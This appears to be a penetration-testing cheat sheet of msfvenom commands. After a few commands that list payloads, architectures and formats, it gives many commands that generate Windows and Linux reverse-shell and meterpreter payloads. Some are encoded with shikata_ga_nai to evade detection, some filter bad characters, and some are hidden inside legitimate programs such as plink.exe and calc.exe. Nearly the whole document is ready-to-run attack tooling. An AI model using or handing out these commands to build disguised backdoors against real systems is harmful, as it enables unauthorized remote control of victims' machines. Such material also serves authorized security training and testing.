# Msfvenom

## General commands

* List all payload types, architecture types, encoders and platforms:

```
msfvenom -l payloads
msfvenom -l archs
msfvenom -l encoders
msfvenom -l platforms
```

* Filter for windows x32 and x64 payloads:

```
msfvenom -l payloads --platform windows --arch x86
msfvenom -l payloads --platform windows --arch x64
```

* Filter for linux x32 and x64 payloads:

```
msfvenom -l payloads --platform linux --arch x86
msfvenom -l payloads --platform linux --arch x64
```

* Show output formats (asp, bash, c, dll, elf, exe, jar, php, powershell, python, raw, sh and more):

```
msfvenom -l formats
```

## Payload Generation

### Common payloads

* &#x20;Windows TCP reverse shell executable:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=55555 -f exe -o out.exe
```

* Linux staged x86 reverse shell payload:

```
$msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LOCALIP LPORT=443 -o staged.out -f elf-so
```

* Linux non-staged x86 reverse shell payload:&#x20;

```
$msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -o non-staged.out -f elf
```

* Linux non-staged x64 payload:

```
$msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -o non-staged.out -f elf
```

```
$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=443 -f exe -o meterpreter.exe
```

###

###

###

###

###

### C payloads

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f c
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

```
msfvenom -p linux/x86/shell_bind_tcp LPORT=$PORT -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
```

### JS\_LE payloads

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f js_le -e generic/none
```

### EXE payloads

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -o shell_reverse.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

```
msfvenom -p windows/meterpreter/reverse_https LHOST=$LOCALIP LPORT=$PORT -f exe -o met_https_reverse.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -o shell_reverse.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

```
msfvenom -p windows/meterpreter/reverse_http LHOST=$LOCALIP LPORT=$PORT -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o out.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=$PORT -f exe -k -x calc.exe -o calc_2.exe
```



































